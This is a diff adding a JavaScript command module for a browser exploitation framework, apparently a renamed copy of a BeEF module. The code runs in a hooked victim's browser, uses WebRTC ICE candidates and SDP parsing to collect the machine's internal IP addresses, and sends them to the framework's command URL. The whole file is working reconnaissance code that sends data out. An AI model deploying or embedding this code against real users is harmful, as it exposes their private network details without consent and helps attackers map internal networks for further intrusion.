@@ -1,0 +1,104 @@
+//
+// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (Server) - https://serverproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+server.execute(function() {
+
+   var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+
+    if (window.RTCIceGatherer || RTCPeerConnection){
+
+        var addrs = Object.create(null);
+        addrs["0.0.0.0"] = false;
+        
+        // Prefer RTCIceGatherer of simplicity.
+        if (window.RTCIceGatherer) {
+            var iceGatherer = new RTCIceGatherer({
+                "gatherPolicy": "all",
+                "iceServers": [ ],
+            });
+            iceGatherer.onlocalcandidate = function (evt) {
+                if (evt.candidate.type) {
+                  // There may be multiple IP addresses
+                  if (evt.candidate.type == "host") {
+                      // The ones marked "host" are local IP addresses
+                      processIPs(evt.candidate.ip);
+                  };
+                } else {
+                  retResults();
+                };
+            };
+            iceGatherer.onerror = function (e) {
+                server.debug("ICE Gatherer Failed");
+                server.net.send('<%= @command_url %>', <%= @command_id %>, "ICE Gatherer Failed", server.are.status_error());
+            };
+        } else {
+          // Construct RTC peer connection
+          var servers = {iceServers:[]};
+          var mediaConstraints = {optional:[{googIPv6: true}]};
+          var rtc = new RTCPeerConnection(servers, mediaConstraints);
+          rtc.createDataChannel('', {reliable:false});
+
+          // Upon an ICE candidate being found
+          // Grep the SDP data for IP address data
+          rtc.onicecandidate = function (evt) {
+              if (evt.candidate){
+                // There may be multiple local IP addresses
+                server.debug("a="+evt.candidate.candidate);
+                grepSDP("a="+evt.candidate.candidate);
+              } else {
+                // No more candidates: return results.
+                retResults();
+              };
+          };
+
+          // Create an SDP offer
+          rtc.createOffer(function (offerDesc) {
+              grepSDP(offerDesc.sdp);
+              rtc.setLocalDescription(offerDesc);
+              retResults();
+          }, function (e) {
+              server.debug("SDP Offer Failed");
+              server.net.send('<%= @command_url %>', <%= @command_id %>, "SDP Offer Failed", server.are.status_error());
+          });
+        };
+
+        function retResults(){
+            var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
+
+            // This is for the ARE, as this module is async, so we can't just return as we would in a normal sync way
+            get_internal_ip_webrtc_mod_output = [server.are.status_success(), displayAddrs.join(",")];
+        }
+
+        // Return results
+        function processIPs(newAddr) {
+            if (newAddr in addrs) return;
+            else addrs[newAddr] = true;
+            var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
+            server.debug("Found IPs: "+ displayAddrs.join(","));
+            server.net.send('<%= @command_url %>', <%= @command_id %>, "IP is " + displayAddrs.join(","), server.are.status_success());
+        }
+
+
+        // Retrieve IP addresses from SDP 
+        function grepSDP(sdp) {
+            var hosts = [];
+            sdp.split('\r\n').forEach(function (line) { // c.f. http://tools.ietf.org/html/rfc4566#page-39
+                if (~line.indexOf("a=candidate")) {     // http://tools.ietf.org/html/rfc4566#section-5.13
+                    var parts = line.split(' '),        // http://tools.ietf.org/html/rfc5245#section-15.1
+                        addr = parts[4],
+                        type = parts[7];
+                    if (type === 'host') processIPs(addr);
+                } else if (~line.indexOf("c=")) {       // http://tools.ietf.org/html/rfc4566#section-5.7
+                    var parts = line.split(' '),
+                        addr = parts[2];
+                    processIPs(addr);
+                }
+            });
+        }
+    }else {
+        server.net.send('<%= @command_url %>', <%= @command_id %>, "Browser doesn't appear to support RTCPeerConnection", server.are.status_error());
+    }
+});
